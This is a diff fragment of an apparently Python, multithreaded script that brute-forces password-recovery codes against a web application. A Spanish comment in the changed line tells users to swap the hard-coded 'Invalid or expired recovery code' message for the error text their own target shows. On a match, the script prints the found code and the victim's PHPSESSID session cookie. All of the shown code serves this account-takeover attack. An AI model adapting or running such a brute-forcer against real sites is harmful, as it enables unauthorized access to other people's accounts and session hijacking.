@@ -68,7 +68,7 @@ def worker(code):
         if r is None:
             continue
 
-        if "Invalid or expired recovery code" not in r.text:
+        if "Invalid or expired recovery code" not in r.text: #cambiar el mensaje de error "Invalid or expired recovery code" por el del erros que les muestre 
             print(f"\n[✅] Hilo {code} → ¡Código correcto encontrado! => {code}")
             print(f"[🍪] PHPSESSID: {session.cookies.get_dict().get('PHPSESSID', 'No encontrado')}")
             found.set()
